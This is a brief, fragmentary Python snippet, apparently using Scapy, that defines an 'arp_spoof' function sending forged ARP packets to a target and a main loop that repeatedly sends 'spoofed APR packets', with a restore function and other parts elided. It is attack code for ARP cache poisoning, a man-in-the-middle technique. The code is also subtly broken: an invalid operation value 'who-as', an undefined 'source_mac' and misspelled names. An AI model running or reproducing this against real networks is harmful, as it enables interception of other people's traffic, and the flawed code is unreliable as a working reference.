...
def arp_spoof(dest_ip, dest_mac, source_ip): 
   packet= ARP(op="who-as", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
   send(packet, verbose=True)


def art_restore(dest_ip, dest_mac, source_ip, source_mac): 
...
def main(): 
   ...
   try:
      print("Sending spoofed APR packets")
      while True: 
